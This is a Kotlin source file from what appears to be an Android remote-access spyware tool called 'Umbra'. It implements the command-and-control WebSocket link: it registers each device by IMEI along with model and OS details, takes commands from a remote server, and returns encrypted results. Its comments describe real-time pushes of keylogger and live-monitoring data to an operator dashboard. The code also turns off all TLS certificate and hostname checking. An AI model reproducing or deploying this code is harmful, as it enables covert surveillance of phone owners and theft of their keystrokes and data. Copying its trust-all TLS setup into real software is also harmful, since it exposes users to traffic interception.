package org.umbra.core.c2

import android.os.Build
import android.util.Log
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import okhttp3.*
import java.util.concurrent.TimeUnit
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import java.security.cert.X509Certificate

class WebSocketTransport(
    private val serverUrl: String,
    private val onCommand: (Command) -> String,
    private val onStatus: (String) -> Unit = {}
) {
    companion object {
        private const val TAG = "Umbra.WS"
        private const val MAX_RECONNECT_DELAY = 30_000L   // exponential backoff ceiling: 30s
        private const val INITIAL_RECONNECT_DELAY = 500L  // first retry after 500ms
        private const val PING_INTERVAL = 10_000L         // OkHttp native WebSocket ping
    }

    private val json = Json { ignoreUnknownKeys = true }

    private val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
        override fun checkClientTrusted(c: Array<X509Certificate>?, a: String?) {}
        override fun checkServerTrusted(c: Array<X509Certificate>?, a: String?) {}
        override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
    })

    private val client = OkHttpClient.Builder()
        .pingInterval(PING_INTERVAL, TimeUnit.MILLISECONDS)
        .sslSocketFactory(
            SSLContext.getInstance("TLS").apply { init(null, trustAllCerts, java.security.SecureRandom()) }.socketFactory,
            trustAllCerts[0] as X509TrustManager
        )
        .hostnameVerifier { _, _ -> true }
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()

    private var ws: WebSocket? = null
    private var reconnectDelay = INITIAL_RECONNECT_DELAY
    @Volatile private var shouldReconnect = false
    @Volatile private var connected = false
    @Volatile private var connecting = false
    @Volatile private var reconnectScheduled = false
    private var deviceId: String = ""

    private val lock = Any()

    // Device info collected at connect time
    @Serializable
    data class DeviceInfo(
        val model: String,
        val os_version: String,
        val arch: String,
        val hostname: String
    )

    // Register message matching server's WSMessage format
    @Serializable
    data class RegisterMessage(
        val type: String,
        val device_id: String,
        val info: DeviceInfo
    )

    // Result wrapper matching server's WSMessage format
    @Serializable
    data class ResultMessage(
        val type: String,
        val device_id: String,
        val command_id: String,
        val data: String
    )

    // Application-level keepalive ping (keeps server LastSeen fresh)
    @Serializable
    data class AppPing(
        val type: String,
        val device_id: String
    )

    // Minimal envelope used only to detect the incoming message type.
    @Serializable
    data class WsEnvelope(val type: String = "")

    private fun collectDeviceInfo(): DeviceInfo {
        val model = Build.MODEL ?: "unknown"
        val osVersion = Build.VERSION.RELEASE ?: "0"
        val arch = Build.SUPPORTED_ABIS?.firstOrNull() ?: System.getProperty("os.arch") ?: "unknown"
        val hostname = Build.BRAND ?: "android"
        return DeviceInfo(
            model = model,
            os_version = osVersion,
            arch = arch,
            hostname = hostname
        )
    }

    fun connect(imei: String) {
        deviceId = imei
        shouldReconnect = true
        reconnectDelay = INITIAL_RECONNECT_DELAY
        reconnectScheduled = false
        doConnect()
    }

    fun disconnect() {
        shouldReconnect = false
        connected = false
        try { ws?.close(1000, "bye") } catch (_: Exception) {}
        ws = null
    }

    fun send(payload: String) {
        try { ws?.send(payload) } catch (e: Exception) {
            Log.w(TAG, "send failed: ${e.message}")
        }
    }

    /**
     * Sends a result-typed WS message carrying [encryptedData] (already AES-GCM
     * encrypted + base64). This is used for unsolicited real-time pushes
     * (keylogger, live monitors) that are NOT replies to a specific command.
     * The server's handleResult() decrypts `data` and broadcasts it to the
     * dashboard over SSE.
     */
    fun sendResult(commandId: String, encryptedData: String) {
        if (!connected) return
        try {
            val resultMsg = json.encodeToString(ResultMessage(
                type = "result",
                device_id = deviceId,
                command_id = commandId,
                data = encryptedData
            ))
            ws?.send(resultMsg)
        } catch (e: Exception) {
            Log.w(TAG, "sendResult failed: ${e.message}")
        }
    }

    /**
     * Application-level ping. The server treats a `ping` WS message as a liveness
     * signal (updates LastSeen) and replies with `pong`. Without this the server's
     * offline checker marks the device offline after ~45s even though the socket
     * itself is alive.
     */
    fun sendAppPing() {
        if (!connected) return
        try {
            ws?.send(json.encodeToString(AppPing(type = "ping", device_id = deviceId)))
        } catch (e: Exception) {
            Log.w(TAG, "app ping failed: ${e.message}")
        }
    }

    fun isConnected(): Boolean = connected

    private fun doConnect() {
        synchronized(lock) {
            if (!shouldReconnect) return
            if (connecting) return
            connecting = true
        }
        Log.d(TAG, "Connecting to $serverUrl (device=$deviceId)")
        val request = Request.Builder().url(serverUrl).build()
        ws = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                synchronized(lock) { connecting = false }
                connected = true
                reconnectDelay = INITIAL_RECONNECT_DELAY
                onStatus("connected")
                sendRegister(ws)
            }

            override fun onMessage(ws: WebSocket, text: String) {
                handleMessage(ws, text)
            }

            override fun onFailure(ws: WebSocket, t: Throwable, resp: Response?) {
                synchronized(lock) { connecting = false }
                connected = false
                onStatus("disconnected: ${t.message}")
                scheduleReconnect()
            }

            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                synchronized(lock) { connecting = false }
                connected = false
                onStatus("closed: $code")
                scheduleReconnect()
            }
        })
    }

    // Re-register on every (re)connect.
    private fun sendRegister(ws: WebSocket) {
        try {
            val info = collectDeviceInfo()
            val registerMsg = json.encodeToString(RegisterMessage(
                type = "register",
                device_id = deviceId,
                info = info
            ))
            Log.d(TAG, "Sending register: $registerMsg")
            ws.send(registerMsg)
        } catch (e: Exception) {
            Log.e(TAG, "register send failed: ${e.message}")
        }
    }

    private fun handleMessage(ws: WebSocket, text: String) {
        try {
            Log.d(TAG, "Received: $text")
            val envelope = try {
                json.decodeFromString<WsEnvelope>(text)
            } catch (_: Exception) {
                WsEnvelope("")
            }

            when (envelope.type) {
                "pong" -> { /* keepalive ack — nothing to do */ }
                else -> {
                    // Commands arrive as {type:"command", command_id, module, action, params}.
                    // Fall back to treating any non-pong payload as a command.
                    val cmd = json.decodeFromString<Command>(text)
                    val encryptedResult = onCommand(cmd)

                    val resultMsg = json.encodeToString(ResultMessage(
                        type = "result",
                        device_id = deviceId,
                        command_id = cmd.cmd_id,
                        data = encryptedResult
                    ))
                    ws.send(resultMsg)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "parse error: ${e.message}")
            try {
                val errMsg = json.encodeToString(ResultMessage(
                    type = "result",
                    device_id = deviceId,
                    command_id = "?",
                    data = """{"status":"error","error":"parse_failed:${e.message}"}"""
                ))
                ws.send(errMsg)
            } catch (_: Exception) {}
        }
    }

    private fun scheduleReconnect() {
        val delay: Long
        synchronized(lock) {
            if (!shouldReconnect) return
            if (reconnectScheduled) return  // single-flight: onFailure+onClosed fire together
            reconnectScheduled = true
            delay = reconnectDelay
        }
        Thread {
            try {
                Thread.sleep(delay)
            } catch (_: InterruptedException) {
                // interrupted on disconnect
            }
            synchronized(lock) {
                reconnectDelay = (reconnectDelay * 2).coerceAtMost(MAX_RECONNECT_DELAY)
                reconnectScheduled = false
            }
            if (shouldReconnect) {
                Log.d(TAG, "Reconnecting in ${delay}ms (next=${reconnectDelay}ms)")
                doConnect()
            }
        }.apply { isDaemon = true; start() }
    }
}
